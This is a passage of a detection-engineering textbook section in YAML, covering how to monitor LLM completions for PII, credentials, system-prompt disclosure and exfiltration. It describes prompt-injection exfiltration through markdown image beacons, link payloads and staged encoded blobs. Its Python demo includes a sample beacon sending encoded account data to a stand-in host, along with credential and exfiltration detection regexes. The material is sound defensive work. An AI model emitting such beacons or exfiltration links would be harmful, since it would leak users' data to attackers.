@@ -1,0 +1,1290 @@
+# section_05_08_llm_output_monitoring.yaml
+
+---
+document_info:
+  title: 'LLM Output Monitoring: PII Leakage, Toxicity, Data Exfiltration'
+  chapter: 5
+  section: 8
+  section_code: '0508'
+  author: 'Raghav Dinesh'
+  github: 'https://github.com/ruwgxo/detection-engineering-at-scale'
+  license: 'MIT'
+  version: '1.0'
+  created: '2026-07-18'
+  estimated_pages: 5
+  estimated_reading_time: '40-50 minutes'
+
+section_overview:
+  one_line_summary: |-
+    The completion channel is an egress path, so completions are inspected as
+    telemetry: a staged pipeline of pluggable, cost-tiered checks emits
+    findings that carry offsets and salted hashes but never raw values,
+    detection stays strictly separate from redaction so scrubbing content never
+    erases the incident, system prompt leakage is proven rather than inferred
+    via canaries and template fingerprints, and staged exfiltration is caught by
+    correlation that inline filtering structurally cannot perform.
+  why_this_section_exists: |-
+    Four sections of this chapter have inspected what goes into the model and
+    what is consumed from it. None has looked at what comes out, and that gap
+    is where a specific class of incident lives. A model that has been
+    successfully injected does its damage in the completion. A model that has
+    memorised training data discloses it in the completion. A model whose
+    system prompt has been extracted reveals it in the completion. An agent
+    exfiltrating data does so through output that a client renders. Monitoring
+    prompts alone means detecting attempts while missing every success.
+
+    The framing that makes this tractable is to stop treating completions as
+    product output that happens to be inspectable and start treating them as
+    telemetry that happens to be user-visible. Every other egress channel in
+    the enterprise -- email, file transfer, DNS -- is monitored on that basis,
+    and nobody argues that inspecting outbound email is a product feature
+    decision. The completion channel is younger, so the argument still has to
+    be made, and it is made most sharply by the security preview: every
+    completion the platform does not inspect is an unmonitored egress channel
+    wearing a product feature clothing.
+
+    Two constraints shape everything that follows. The first is that output
+    monitoring is where a detection program most easily builds the exact
+    database it exists to prevent -- a searchable store of every card number,
+    credential, and health detail the model has ever emitted. The second is
+    that the obvious mitigation, inline redaction, quietly destroys detection
+    if it is allowed to substitute for it.
+  position_in_chapter: |-
+    Eighth section of Chapter 5 and the last detector-building section. It
+    fills the LLM02, LLM05, and LLM07 rows of the Section 5.2 matrix and closes
+    the system-prompt loop opened by the extraction-attempt patterns in Section
+    5.4 -- attempts are detected on the prompt side, disclosure is proven here.
+    It also completes the traffic-side stack that Section 5.9 assembles under a
+    latency budget, which is why every check in this section declares a cost
+    tier. Section 5.10 then consolidates the completed coverage map.
+
+learning_objectives:
+  knowledge:
+  - 'Explain why the completion channel is an egress path and what monitoring
+    only prompts structurally misses'
+  - 'State the per-data-class method selection rule for PII detection and why a
+    single global method choice fails in both directions'
+  - 'Explain why jurisdiction affects scope and severity but not detection
+    logic'
+  - 'Distinguish toxicity monitoring as policy detection from security
+    detection, and explain why they share a pipeline anyway'
+  - 'Name the exfiltration side channels available through completions:
+    auto-rendering beacons, link payloads, encoded blobs, and tool-call
+    arguments'
+  - 'Explain canary-based system prompt leakage detection and what template
+    fingerprinting adds when a canary is stripped'
+  - 'Explain why redaction is response rather than detection, and what breaks
+    when they are coupled'
+  skills:
+  - 'Build a staged output pipeline with pluggable, cost-tiered checks'
+  - 'Emit findings that carry offsets and salted hashes rather than matched
+    values'
+  - 'Plant and register system prompt canaries and detect both verbatim and
+    paraphrased disclosure'
+  - 'Write correlation rules over output findings, including staged
+    exfiltration across a conversation'
+  - 'Specify a PII contract with jurisdiction profiles that scope classes
+    without branching detection logic'
+  security_mindset:
+  - 'Treat every uninspected completion as unmonitored egress'
+  - 'Refuse to let an output monitor become a curated store of the sensitive
+    data it protects'
+  - 'Never allow a filter to replace an alert -- scrubbed content with no
+    finding is an incident that did not happen'
+  - 'Assume exfiltration is staged across turns, because the single-turn
+    version is the one everyone already blocks'
+
+prerequisites:
+- 'Section 5.1: completion_events, the restricted-content privacy regime, and
+  the rule that redaction is response rather than detection'
+- 'Section 5.2: the LLM02, LLM05, and LLM07 coverage rows and the Sigma tag
+  convention'
+- 'Section 5.4: the layered detection architecture and contract-based
+  pluggability this section reuses for output checks'
+- 'Section 5.7: the metadata-only telemetry discipline, applied here to
+  findings rather than to consumption'
+- 'Chapter 2, Section 2.3: the correlation engine that staged-exfiltration
+  detection requires'
+- 'Chapter 12 (forward): response orchestration, which owns redaction and
+  blocking decisions'
+
+prose_content:
+  part_1:
+    title: 'The Completion Channel as Egress'
+    body: |-
+      Ask a security team how outbound email is monitored and they will
+      describe content inspection, data-loss rules, and an alert queue. Ask how
+      model completions are monitored and the answer is frequently that a
+      guardrail product filters them, or that nobody has looked. The asymmetry
+      is not principled. Both are channels through which internal data leaves
+      an environment toward a recipient. One is old enough to have an
+      established control category and the other is not.
+
+      Reframing completions as egress makes the detection requirements fall
+      out immediately. Egress channels get inspected for sensitive data
+      leaving, they get monitored for covert channels, their findings feed
+      correlation rather than terminating locally, and they are instrumented
+      whether or not a preventive control also exists. Applied to completions,
+      that means PII and secret detection, exfiltration side-channel detection,
+      system prompt disclosure detection, and findings that reach the platform.
+
+      The reframing also settles a recurring argument about ownership. Output
+      filtering is usually built by the application team as a product quality
+      feature -- keeping the assistant from saying something embarrassing --
+      and security inherits whatever that produces. But a quality filter
+      optimises for the user not seeing bad output, while a detection system
+      optimises for the organisation knowing bad output occurred. Those goals
+      diverge precisely at the moment that matters, which is why part 5 treats
+      the separation of detection from redaction as the section load-bearing
+      architectural claim rather than a stylistic preference.
+  part_2:
+    title: 'PII Detection: Method Per Data Class, Jurisdiction Per Scope'
+    body: |-
+      The most common PII-detection error is choosing one method and applying
+      it everywhere. Pattern matching over structured identifiers is precise
+      and cheap: a card number has a shape and a checksum, an API key has a
+      prefix and an entropy floor, and a finding either validates or it does
+      not. Applied to names, addresses, or free-text health detail, the same
+      approach is blind, because those have no shape. Classifier and NER
+      methods handle exactly that unstructured case and generalise to mentions
+      nobody enumerated -- and applied to card numbers they produce noise while
+      an eight-line regex with a checksum would have been exact.
+
+      The contract deliverable therefore selects method per data class rather
+      than globally: pattern methods with validation for payment cards,
+      government identifiers, credentials, and contact details; classifier
+      methods with confidence floors for person names and health detail. The
+      evaluation gate follows the same principle and is deliberately per class,
+      because an aggregate precision and recall figure will happily hide a data
+      class that is entirely undetected behind strong numbers on the easy ones.
+
+      Jurisdiction enters as scope and severity, not as logic. What counts as
+      protected, and what response tier a finding warrants, genuinely differ
+      across regions and applications -- special-category handling under GDPR,
+      covered-entity status for health data, and a minimal floor profile for
+      applications with no assigned jurisdiction that still never leaves
+      credentials unmonitored. But the detection of a card number does not
+      change by region. Keeping jurisdiction in profiles that select classes
+      and severities, rather than branching the detectors, means one detector
+      serves every region and a regulatory change is a configuration edit.
+      Building it the other way produces per-region detector forks that drift
+      apart within two quarters.
+  part_3:
+    title: 'Toxicity: Policy Detection Sharing a Security Pipeline'
+    body: |-
+      Toxicity and policy-violation monitoring sit awkwardly in a security
+      book, and the honest treatment is to say why they are here and what they
+      are not. A model producing abusive, discriminatory, or otherwise
+      policy-violating output is a serious problem, but it is usually a product
+      and trust-and-safety problem rather than a security incident: no
+      adversary is required, the harm is reputational and human rather than
+      confidentiality-related, and the owning team is rarely the SOC.
+
+      They belong in this pipeline anyway, for two reasons that are
+      architectural rather than definitional. First, they need exactly the same
+      infrastructure: completion interception, staged checks, findings with
+      offsets, a routing layer, and a response tier. Building a second
+      inspection path for policy checks means two places where completions are
+      read, two privacy reviews, and two latency budgets on the same request.
+      Second, the boundary between policy and security is genuinely porous in
+      one direction: a sudden shift in an application policy-violation rate is
+      a strong indicator that something upstream changed, and jailbreak success
+      frequently shows up first as a policy-violation spike rather than as a
+      security alert.
+
+      What keeps the distinction honest is routing rather than separation. The
+      pipeline emits both kinds of finding with their data class attached, and
+      the platform routes policy findings to the owning team while security
+      findings page the SOC -- with a correlation rule watching for the case
+      where a policy-violation rate change coincides with jailbreak scoring
+      from Section 5.5. Sharing the pipeline is efficiency; sharing the alert
+      queue would be a category error that buries security findings under
+      volume the SOC cannot action.
+  part_4:
+    title: 'Exfiltration Side Channels in Output'
+    body: |-
+      The exfiltration case is where output monitoring stops being a variation
+      on data-loss prevention and becomes specific to this attack surface,
+      because the model can be induced to construct the channel itself.
+
+      The sharpest example is the auto-rendering beacon. Many chat clients
+      render markdown, including images. A completion containing an image
+      reference causes the client to issue a request to that URL without any
+      user action, and an attacker who has injected the model can have it embed
+      data in the URL query string. The result is zero-click exfiltration
+      through a feature nobody thought of as a channel: the user sees a broken
+      image at worst, and the data has already left. The pipeline treats any
+      auto-fetching resource reference in a completion as a critical finding,
+      and pairs it with a check for long opaque payloads in link parameters,
+      which catches the same technique through ordinary links.
+
+      Encoded blobs are the second channel and require more care, because
+      base64 in output is entirely normal for a developer assistant returning a
+      fixture. The check therefore looks at context, firing on encoded content
+      in prose rather than in code blocks, and it is deliberately assigned a
+      lower cost tier and severity than the beacon check. The third channel is
+      tool-call arguments, where a hijacked agent moves data through a
+      function call rather than through visible output -- covered by the
+      action-log rules Section 5.9 assembles, and named here so the map is
+      complete. What all three share is that the single-instance version is
+      the easy case; the hard case is staged, which part 5 addresses.
+  part_5:
+    title: 'Detection Is Not Redaction, and Findings Must Reach Correlation'
+    body: |-
+      This is the section architectural claim, and it is the one most
+      implementations get wrong. The intuitive design puts a filter in the
+      response path: inspect the completion, scrub anything sensitive, return
+      the clean version. It protects the user, satisfies the product
+      requirement, and produces no alert -- which means an incident occurred,
+      was observed by the platform, and left no record. Every subsequent
+      question the organisation might ask is now unanswerable: how often does
+      this happen, which application, which identity, is it increasing, did it
+      start after last week release.
+
+      The pipeline enforces the separation structurally. Checks emit findings.
+      Detection produces a redaction map -- a list of offset ranges -- and
+      stops. A separate response layer may apply that map, log it, or ignore
+      it, and the finding exists either way. The demonstration proves the
+      property directly: the beacon case is scrubbed of its exfiltration URL
+      and the finding survives the scrubbing. That ordering also preserves the
+      Chapter 12 boundary, since whether to redact, block, or allow is a policy
+      decision that belongs to response.
+
+      The second half of the claim is that findings must reach the correlation
+      engine rather than terminating at the filter, and the staged-exfiltration
+      rule is why. An attacker who knows a single large encoded blob is caught
+      splits the payload across turns, and each individual chunk is
+      unremarkable -- too short to alarm, too ordinary to block. Only a rule
+      counting encoded-blob findings within a conversation window sees the
+      campaign, and that rule can only exist if every finding, including ones
+      the response layer chose not to act on, lands in the platform. A pipeline
+      that filters inline and emits nothing has not just lost an alert; it has
+      made an entire class of attack structurally undetectable.
+  part_6:
+    title: 'Privacy-Safe Monitoring and the Placement Question'
+    body: |-
+      Output monitoring creates a specific hazard the rest of the chapter does
+      not. A monitor that records what it found accumulates, in one place, with
+      broad analyst access and long retention, every payment card, credential,
+      and health detail the platform has ever emitted. That store is more
+      valuable to an attacker than the model, and the security team built it.
+
+      The pipeline avoids this by construction: findings carry the check name,
+      the data class, the severity, the span offsets, and a salted hash of the
+      matched value -- never the value. The offsets let the response layer
+      redact and let an investigator retrieve the original from the
+      short-retention completion store under break-glass access. The salted
+      hash allows the one correlation that matters operationally -- the same
+      value leaking repeatedly across completions -- without the platform ever
+      holding the value. The demonstration asserts the property rather than
+      documenting it, checking that no raw secret or card number appears in any
+      emitted event. The same principle governs the canary registry, which
+      stores hashed shingles rather than system prompt text, and the Sigma pack,
+      which matches on finding metadata rather than completion content so
+      sensitive matching logic never moves into the SIEM.
+
+      Placement is the remaining decision, and this section prepares it rather
+      than making it. Every check declares a cost tier, and the pipeline runs
+      whichever tiers are enabled, so the same code serves inline inspection
+      and asynchronous analysis -- the tiering demonstration shows the encoded
+      blob check contributing nothing inline and firing once the near-real-time
+      tier is enabled. Cheap deterministic checks such as beacon detection are
+      inline candidates because their precision is high and the harm they
+      prevent is immediate; classifier-based PII checks are more expensive and
+      often better placed asynchronously, accepting that detection follows
+      delivery. Section 5.9 makes that call under an explicit latency budget,
+      and it can do so as configuration because this pipeline never assumed a
+      placement.
+
+reference_materials:
+  table_1:
+    title: 'What Output Monitoring Catches That Prompt Monitoring Cannot'
+    description: |-
+      The incident classes visible only on the completion side, and the
+      framework row each fills.
+    columns:
+    - 'Incident class'
+    - 'Why prompts do not show it'
+    - 'Output signal'
+    - 'Framework row'
+    rows:
+    - - 'Successful injection'
+      - 'The prompt shows the attempt; success is only visible in what the
+        model did'
+      - 'Beacon, credential echo, or policy break in the completion'
+      - 'LLM02, LLM05'
+    - - 'Training-data memorisation'
+      - 'No adversarial prompt required; an ordinary question elicits it'
+      - 'PII findings with no corresponding input PII'
+      - 'LLM02'
+    - - 'System prompt disclosure'
+      - 'Extraction attempts are detectable, but attempts are not disclosures'
+      - 'Canary hit or template fingerprint overlap'
+      - 'LLM07'
+    - - 'Zero-click exfiltration'
+      - 'The injected instruction may arrive in retrieved content, not the
+        prompt'
+      - 'Auto-rendering resource reference in output'
+      - 'LLM02, LLM05'
+    - - 'Staged exfiltration'
+      - 'Each turn is unremarkable on both sides'
+      - 'Repeated encoded-blob findings correlated per conversation'
+      - 'LLM02'
+  table_2:
+    title: 'PII Method Selection by Data Class'
+    description: |-
+      The per-class method assignment from the contract, with the validation
+      that makes each usable and the failure mode of choosing the other method.
+    columns:
+    - 'Data class'
+    - 'Method'
+    - 'Validation'
+    - 'Failure if the other method is used'
+    rows:
+    - - 'Payment card'
+      - 'Pattern'
+      - 'Luhn checksum required'
+      - 'NER produces constant noise on any digit sequence'
+    - - 'Government identifier'
+      - 'Pattern'
+      - 'Format plus jurisdiction checksum where one exists'
+      - 'NER cannot distinguish an identifier from a reference number'
+    - - 'Credential or secret'
+      - 'Pattern'
+      - 'Known prefixes plus entropy floor; separators allowed in the body'
+      - 'NER has no concept for it; the class goes undetected'
+    - - 'Person name'
+      - 'Classifier / NER'
+      - 'Confidence floor; public-figure suppression'
+      - 'Pattern methods are structurally blind to names'
+    - - 'Health detail'
+      - 'Classifier / NER'
+      - 'Confidence floor; special-category escalation under GDPR profile'
+      - 'Pattern methods catch only coded terms and miss free text'
+  table_3:
+    title: 'Exfiltration Channels Through Completions'
+    description: |-
+      The output-side covert channels, how each moves data, and the check and
+      cost tier assigned to each.
+    columns:
+    - 'Channel'
+    - 'Mechanism'
+    - 'Check'
+    - 'Tier / severity'
+    rows:
+    - - 'Auto-rendering beacon'
+      - 'Client renders an image reference, issuing a request with data in the
+        URL; zero user interaction'
+      - 'exfil.markdown_beacon'
+      - 'inline / critical'
+    - - 'Link query payload'
+      - 'Long opaque value in a link parameter the user is invited to click'
+      - 'exfil.link_payload'
+      - 'inline / high'
+    - - 'Encoded blob in prose'
+      - 'Base64 or similar encoding of data in a non-code context'
+      - 'exfil.encoded_blob'
+      - 'near_real_time / medium'
+    - - 'Staged blobs across turns'
+      - 'Payload split so no single completion is alarming'
+      - 'Correlation rule over encoded-blob findings per conversation'
+      - 'async correlation / high'
+    - - 'Tool-call arguments'
+      - 'Hijacked agent moves data through a function call rather than visible
+        output'
+      - 'Action-log rules (assembled in 5.9)'
+      - 'inline / critical'
+  table_4:
+    title: 'Detection Versus Redaction Responsibilities'
+    description: |-
+      The split that keeps scrubbing from erasing incidents, and which layer
+      owns each artifact.
+    columns:
+    - 'Artifact or decision'
+    - 'Owner'
+    - 'Why'
+    rows:
+    - - 'Check execution and finding emission'
+      - 'Detection'
+      - 'The incident record must exist regardless of what happens next'
+    - - 'Redaction map (offset ranges)'
+      - 'Detection produces it'
+      - 'Only the checks know what was matched and where'
+    - - 'Applying the redaction'
+      - 'Response'
+      - 'Whether the user sees scrubbed output is a policy decision'
+    - - 'Blocking the completion'
+      - 'Response (Chapter 12)'
+      - 'Availability tradeoff owned with the application, not the detector'
+    - - 'Raw value retrieval for investigation'
+      - 'Break-glass against the completion store'
+      - 'Findings carry offsets and hashes so the monitor never becomes the
+        sensitive-data store'
+
+deliverables:
+  deliverable_1:
+    title: 'Output Monitoring Pipeline'
+    filename: 'output_monitoring_pipeline.py'
+    description: |-
+      Staged completion inspection with pluggable, cost-tiered checks covering
+      payment cards, credentials, auto-rendering beacons, link payloads, and
+      encoded blobs. Emits findings carrying offsets and salted hashes, returns
+      a redaction map without applying it, and demonstrates that scrubbing
+      content leaves the finding intact.
+    implementation_notes: |-
+      Single quotes throughout per book convention; no double-quotes. Three
+      commitments are asserted rather than described: no raw value appears in
+      any emitted event, the incident survives redaction, and enabling a
+      further cost tier changes coverage without changing the call. The
+      credential regex allows separators in the token body after an earlier
+      draft silently missed every segmented key format -- the pattern-method
+      brittleness the PII contract warns about, met in practice and left in the
+      code comment. The card number in the demo is the industry-standard test
+      value, not real data.
+    code: |
+      #!/usr/bin/env python3
+      # output_monitoring_pipeline.py
+      # Section 0508 -- LLM Output Monitoring: PII Leakage, Toxicity, Data Exfiltration
+      # 20260718 | Detection Engineering: AI Security Detection (Section 0508 LLM Output Monitoring) by Raghav Dinesh
+      # Single quotes throughout per book convention
+      '''Staged completion inspection with pluggable checks.
+
+      The output channel is an egress path. Every completion the platform does not
+      inspect is unmonitored egress wearing a product feature clothing -- so this
+      pipeline treats completions as telemetry first and product output second.
+
+      Three design commitments the demo proves:
+
+      1. DETECTION AND REDACTION ARE SEPARATE. Checks emit findings; a separate
+         response layer decides whether to redact. A pipeline that redacts inline and
+         emits nothing has silently converted an incident into a non-event, which is
+         the failure mode this section argues hardest against.
+
+      2. FINDINGS CARRY NO RAW VALUES. Offsets and salted hashes only, per the PII
+         contract. An output monitor that stores what it found becomes a curated
+         database of exactly the sensitive data it exists to protect.
+
+      3. CHECKS ARE PLUGGABLE AND TIERED. Each check declares a cost tier so the
+         Section 5.9 placement decision can run cheap checks inline and expensive
+         ones asynchronously without rewriting the pipeline.
+      '''
+      from __future__ import annotations
+
+      import hashlib
+      import re
+      import sys
+      from dataclasses import dataclass, field
+
+      # Salt is per-deployment and secret. Hashes let an analyst correlate repeat
+      # leakage of the SAME value across completions without the platform ever
+      # storing the value.
+      FINDING_SALT = b'per-deployment-secret-salt'
+
+
+      def value_hash(value: str) -> str:
+          return hashlib.sha256(FINDING_SALT + value.encode('utf-8')).hexdigest()[:16]
+
+
+      def luhn_valid(digits: str) -> bool:
+          ds = [int(c) for c in digits if c.isdigit()]
+          if len(ds) < 13:
+              return False
+          checksum = 0
+          parity = len(ds) % 2
+          for i, d in enumerate(ds):
+              if i % 2 == parity:
+                  d *= 2
+                  if d > 9:
+                      d -= 9
+              checksum += d
+          return checksum % 10 == 0
+
+
+      @dataclass
+      class Finding:
+          check: str
+          data_class: str
+          severity: str
+          span: tuple
+          value_hash: str
+          detail: str
+
+          def as_event(self) -> dict:
+              '''Emission shape. Note the absence of any raw matched value.'''
+              return {
+                  'check': self.check,
+                  'data_class': self.data_class,
+                  'severity': self.severity,
+                  'span_offsets': list(self.span),
+                  'value_hash': self.value_hash,
+                  'detail': self.detail,
+              }
+
+
+      @dataclass
+      class Check:
+          name: str
+          data_class: str
+          severity: str
+          cost_tier: str            # inline | near_real_time | async
+          run: object               # callable(text) -> list of (span, matched, detail)
+
+          def execute(self, text: str) -> list:
+              out = []
+              for span, matched, detail in self.run(text):
+                  out.append(Finding(self.name, self.data_class, self.severity,
+                                     span, value_hash(matched), detail))
+              return out
+
+
+      # ---- individual checks ----------------------------------------------------
+
+      CARD_RE = re.compile(r'\b(?:\d[ -]?){13,19}\b')
+      # Real key formats are multi-segment (sk_live_..., ghp_..., xoxb-...), so the
+      # body must allow separators. An earlier draft required an unbroken alnum run
+      # and silently missed every segmented key -- the pattern-method brittleness the
+      # PII contract warns about, met in practice.
+      SECRET_RE = re.compile(r'\b(?:sk|ak|tok|ghp|xox[baprs])[_-][A-Za-z0-9_-]{16,}\b')
+      BEACON_RE = re.compile(r'!\[[^\]]*\]\((https?://[^)]+)\)')
+      LINK_EXFIL_RE = re.compile(r'https?://[^\s)]*[?&](?:q|d|data|payload)=([A-Za-z0-9%+/=_-]{16,})')
+      B64_RE = re.compile(r'\b[A-Za-z0-9+/]{40,}={0,2}\b')
+
+
+      def check_payment_card(text: str) -> list:
+          out = []
+          for m in CARD_RE.finditer(text):
+              raw = m.group(0)
+              if luhn_valid(raw):
+                  out.append(((m.start(), m.end()), raw, 'luhn-valid card-shaped sequence'))
+          return out
+
+
+      def check_credential(text: str) -> list:
+          return [((m.start(), m.end()), m.group(0), 'credential-prefixed high-entropy token')
+                  for m in SECRET_RE.finditer(text)]
+
+
+      def check_markdown_beacon(text: str) -> list:
+          '''Markdown image beacons: the classic zero-click exfiltration channel.
+          The client renders the image, which issues a GET to the attacker with data
+          in the URL. No user interaction required.'''
+          out = []
+          for m in BEACON_RE.finditer(text):
+              url = m.group(1)
+              out.append(((m.start(), m.end()), url, 'auto-rendering image URL in completion'))
+          return out
+
+
+      def check_link_exfiltration(text: str) -> list:
+          return [((m.start(), m.end()), m.group(1), 'long opaque payload in link query parameter')
+                  for m in LINK_EXFIL_RE.finditer(text)]
+
+
+      def check_encoded_blob(text: str) -> list:
+          out = []
+          for m in B64_RE.finditer(text):
+              blob = m.group(0)
+              # Encoded blobs are ordinary in code output; the signal is an encoded
+              # blob in prose, so require the surrounding text to be prose-like.
+              window = text[max(0, m.start() - 60):m.start()]
+              if '```' not in window and 'base64' not in window.lower():
+                  out.append(((m.start(), m.end()), blob, 'encoded blob in prose context'))
+          return out
+
+
+      DEFAULT_CHECKS = [
+          Check('pii.payment_card', 'payment_card', 'high', 'inline', check_payment_card),
+          Check('pii.credential', 'credential_secret', 'critical', 'inline', check_credential),
+          Check('exfil.markdown_beacon', 'exfiltration', 'critical', 'inline', check_markdown_beacon),
+          Check('exfil.link_payload', 'exfiltration', 'high', 'inline', check_link_exfiltration),
+          Check('exfil.encoded_blob', 'exfiltration', 'medium', 'near_real_time', check_encoded_blob),
+      ]
+
+
+      @dataclass
+      class PipelineResult:
+          findings: list = field(default_factory=list)
+          tiers_run: list = field(default_factory=list)
+
+          @property
+          def max_severity(self) -> str:
+              order = ['none', 'low', 'medium', 'high', 'critical']
+              best = 'none'
+              for f in self.findings:
+                  if order.index(f.severity) > order.index(best):
+                      best = f.severity
+              return best
+
+
+      def inspect(text: str, checks: list = None, tiers: tuple = ('inline',)) -> PipelineResult:
+          '''Run the checks whose cost tier is enabled for this placement.'''
+          checks = checks if checks is not None else DEFAULT_CHECKS
+          result = PipelineResult(tiers_run=list(tiers))
+          for c in checks:
+              if c.cost_tier in tiers:
+                  result.findings.extend(c.execute(text))
+          return result
+
+
+      def build_redaction_map(result: PipelineResult) -> list:
+          '''Produced by DETECTION, applied by RESPONSE. Returning a map rather than
+          a redacted string is the separation: the response layer may apply it, log
+          it, or ignore it, and the finding exists either way.'''
+          return sorted([f.span for f in result.findings])
+
+
+      def apply_redaction(text: str, spans: list) -> str:
+          '''Belongs to the response layer; shown here only to demonstrate that the
+          finding survives redaction. Never call this INSTEAD of emitting.'''
+          out = text
+          for start, end in sorted(spans, reverse=True):
+              out = out[:start] + '[redacted]' + out[end:]
+          return out
+
+
+      def _demo() -> int:
+          # 4111111111111111 is the industry-standard test card number, not real data.
+          cases = [
+              ('benign completion',
+               'Your refund was approved and will appear on your statement shortly.'),
+              ('card number leaked in completion',
+               'I found the card on file ending in 1111: 4111 1111 1111 1111 for that order.'),
+              ('credential echoed from context',
+               'The integration uses sk_live_9f3ka02mfkd93jska2 as its API key.'),
+              ('markdown image beacon exfiltration',
+               'Here is your summary. ![status](https://collect.example/p?d=YWNjb3VudD1hZG1pbjtiYWxhbmNlPTEyMzQ1)'),
+          ]
+
+          print('inline tier inspection')
+          print('-' * 78)
+          results = {}
+          for label, text in cases:
+              r = inspect(text)
+              results[label] = r
+              print(label.ljust(38) + 'severity=' + r.max_severity.ljust(10)
+                    + str(len(r.findings)) + ' finding(s)')
+              for f in r.findings:
+                  print('      ' + f.check.ljust(24) + 'span=' + str(f.span).ljust(12)
+                        + 'hash=' + f.value_hash)
+
+          # Commitment 2: no raw values anywhere in the emitted events.
+          print('\nemitted event for the credential case:')
+          cred = results['credential echoed from context'].findings[0].as_event()
+          print('  ' + str(cred))
+          assert 'sk_live_9f3ka02mfkd93jska2' not in str(cred), 'raw secret leaked into finding'
+          assert all('4111' not in str(f.as_event())
+                     for f in results['card number leaked in completion'].findings)
+          print('  asserted: no raw value present in any emitted finding')
+
+          # Commitment 1: redaction does not erase the incident.
+          beacon = results['markdown image beacon exfiltration']
+          spans = build_redaction_map(beacon)
+          redacted = apply_redaction(cases[3][1], spans)
+          print('\nresponse layer applied the redaction map:')
+          print('  ' + redacted)
+          assert 'collect.example' not in redacted, 'redaction failed'
+          assert len(beacon.findings) >= 1, 'incident must survive redaction'
+          print('  asserted: content scrubbed AND the finding still exists')
+
+          # Commitment 3: tiering changes what runs, not how it is called.
+          prose_blob = ('The export completed. Reference: '
+                        'QWxsIHlvdXIgYWNjb3VudCByZWNvcmRzIGV4cG9ydGVkIHRvIHRoZSBleHRlcm5hbCBzdG9yZQ==')
+          inline_only = inspect(prose_blob, tiers=('inline',))
+          with_async = inspect(prose_blob, tiers=('inline', 'near_real_time'))
+          print('\ntiering: encoded-blob check is near_real_time')
+          print('  inline tier only        -> ' + str(len(inline_only.findings)) + ' finding(s)')
+          print('  inline + near_real_time -> ' + str(len(with_async.findings)) + ' finding(s)')
+          assert len(inline_only.findings) == 0 and len(with_async.findings) == 1
+          print('  asserted: placement changes coverage without changing the call')
+
+          print('\nSection 5.9 sets which tiers run in the request path under a latency')
+          print('budget. This pipeline makes that a configuration, not a rewrite.')
+          return 0
+
+
+      if __name__ == '__main__':
+          sys.exit(_demo())
+  deliverable_2:
+    title: 'Output Rule Pack'
+    filename: 'sigma_output_rules.yml'
+    description: |-
+      Four rules over the completion_finding category: canary observed in
+      output, credential or payment data in output, auto-rendering beacon, and
+      staged exfiltration correlated across a conversation. Tagged to LLM02,
+      LLM05, and LLM07 per the Section 5.2 convention.
+    implementation_notes: |-
+      The rules deliberately match on FINDING METADATA rather than completion
+      text. Putting content regex in the SIEM would drag completion text into
+      rule evaluation and rebuild the secondary sensitive-data store this
+      section exists to avoid; the pipeline inspects content, the rules
+      correlate and route. The staged-exfiltration rule is the one
+      single-completion inspection cannot replace, and it only works if
+      findings reach the correlation engine rather than terminating at an
+      inline filter.
+    code: |
+      # sigma_output_rules.yml
+      # Section 0508 -- LLM Output Monitoring: PII Leakage, Toxicity, Data Exfiltration
+      # 20260718 | Detection Engineering: AI Security Detection (Section 0508 LLM Output Monitoring) by Raghav Dinesh
+      #
+      # Rules over completion_events and the findings the output pipeline emits.
+      # NOTE ON SHAPE: these rules match on FINDING METADATA (check name, data class,
+      # severity) rather than on completion text. The pipeline does the content
+      # inspection; the rules do correlation, thresholding, and routing. Writing
+      # content regex here instead would put sensitive matching logic into the SIEM
+      # and drag completion text into rule evaluation -- the secondary sensitive-data
+      # store this section exists to avoid.
+      title: System prompt canary observed in completion
+      id: 3e8f5d10-0508-4d01-af01-output0001
+      status: experimental
+      description: A planted canary token from a registered system prompt appeared in model output
+      logsource:
+          product: genai_gateway
+          category: completion_finding
+      detection:
+          selection:
+              check: canary_exact
+          condition: selection
+      fields:
+          - prompt_version
+          - identity.user_id
+          - conversation_id
+      falsepositives:
+          - None expected. A canary has no legitimate reason to appear in output; investigate every hit.
+      level: critical
+      tags:
+          - owasp_llm.2025.llm07
+          - attack.collection
+      ---
+      # sigma_output_rules.yml (rule 2 of 4)
+      # Section 0508 -- 20260718 | Detection Engineering: AI Security Detection (Section 0508 LLM Output Monitoring) by Raghav Dinesh
+      title: Credential or payment data present in model output
+      id: 3e8f5d10-0508-4d02-af02-output0002
+      status: experimental
+      description: The output pipeline raised a high-severity PII finding on a completion
+      logsource:
+          product: genai_gateway
+          category: completion_finding
+      detection:
+          selection:
+              data_class:
+                  - credential_secret
+                  - payment_card
+                  - government_id
+          condition: selection
+      fields:
+          - data_class
+          - value_hash
+          - identity.user_id
+          - endpoint.route
+      falsepositives:
+          - Applications whose function is to echo user-supplied payment data back for confirmation; scope by endpoint.route with an owner and review date
+      level: high
+      tags:
+          - owasp_llm.2025.llm02
+      ---
+      # sigma_output_rules.yml (rule 3 of 4)
+      # Section 0508 -- 20260718 | Detection Engineering: AI Security Detection (Section 0508 LLM Output Monitoring) by Raghav Dinesh
+      title: Auto-rendering beacon in completion
+      id: 3e8f5d10-0508-4d03-af03-output0003
+      status: experimental
+      description: Markdown image or auto-fetched resource in output, the zero-click exfiltration channel
+      logsource:
+          product: genai_gateway
+          category: completion_finding
+      detection:
+          selection:
+              check:
+                  - exfil.markdown_beacon
+                  - exfil.link_payload
+          condition: selection
+      fields:
+          - check
+          - value_hash
+          - conversation_id
+          - identity.user_id
+      falsepositives:
+          - Applications that legitimately return images; allowlist destination hosts rather than disabling the check
+      level: critical
+      tags:
+          - owasp_llm.2025.llm02
+          - owasp_llm.2025.llm05
+          - attack.exfiltration
+      ---
+      # sigma_output_rules.yml (rule 4 of 4)
+      # Section 0508 -- 20260718 | Detection Engineering: AI Security Detection (Section 0508 LLM Output Monitoring) by Raghav Dinesh
+      title: Staged exfiltration across a conversation
+      id: 3e8f5d10-0508-4d04-af04-output0004
+      status: experimental
+      description: Repeated encoded-blob findings within one conversation, indicating data split across turns
+      logsource:
+          product: genai_gateway
+          category: completion_finding
+      detection:
+          selection:
+              check: exfil.encoded_blob
+          condition: selection | count() by conversation_id over 30m >= 3
+      fields:
+          - conversation_id
+          - identity.user_id
+          - value_hash
+      falsepositives:
+          - Developer-assistant applications returning encoded fixtures; scope by application before tuning the count
+      level: high
+      tags:
+          - owasp_llm.2025.llm02
+          - attack.exfiltration
+      comment: >
+          This is the rule single-completion inspection cannot replace: each blob is
+          individually unremarkable and only the sequence is the incident. It requires
+          output findings to reach the correlation engine rather than terminating at an
+          inline filter -- the architectural point of part 5.
+  deliverable_3:
+    title: 'System Prompt Canary Kit'
+    filename: 'system_prompt_canary_kit.py'
+    description: |-
+      Canary minting, registration, and scanning for system prompt disclosure.
+      Exact canary hits are proof rather than probability; template
